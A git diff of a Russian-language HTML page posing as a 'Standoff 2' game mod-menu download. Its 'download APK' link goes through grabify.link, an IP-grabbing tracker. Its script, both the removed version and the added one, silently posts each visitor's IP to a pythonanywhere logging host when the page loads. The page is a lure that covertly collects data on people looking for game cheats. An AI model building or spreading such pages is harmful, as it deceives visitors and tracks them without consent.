@@ -1,9 +1,8 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Standoff 2 – Мод-меню</title>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Standoff 2 – Мод-меню</title>
 </head>
 <body>
     <h1>Standoff 2 – Мод-меню</h1>
@@ -11,33 +10,15 @@
     <a href="https://grabify.link/4QX57L">Скачать APK</a>
 
     <script>
-        (function() {
-            const LOGGER_URL = "https://ryzendevcreate.pythonanywhere.com/log";
-
-            function sendIP() {
-                fetch(LOGGER_URL, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({ page: "Standoff2-mod-menu" })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log("✅ IP отправлен:", data.ip);
-                })
-                .catch(err => {
-                    console.warn("⚠️ Не удалось отправить IP:", err);
-                });
-            }
-
-            // Отправляем IP после загрузки страницы
-            if (document.readyState === "complete") {
-                sendIP();
-            } else {
-                window.addEventListener("load", sendIP);
-            }
-        })();
+        // Отправка IP на ваш сервер
+        fetch("https://devryzencreate.pythonanywhere.com/log", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ page: "Standoff2" })
+        })
+        .then(response => response.json())
+        .then(data => console.log("✅ IP отправлен:", data))
+        .catch(error => console.warn("⚠️ Ошибка:", error));
     </script>
 </body>
 </html>
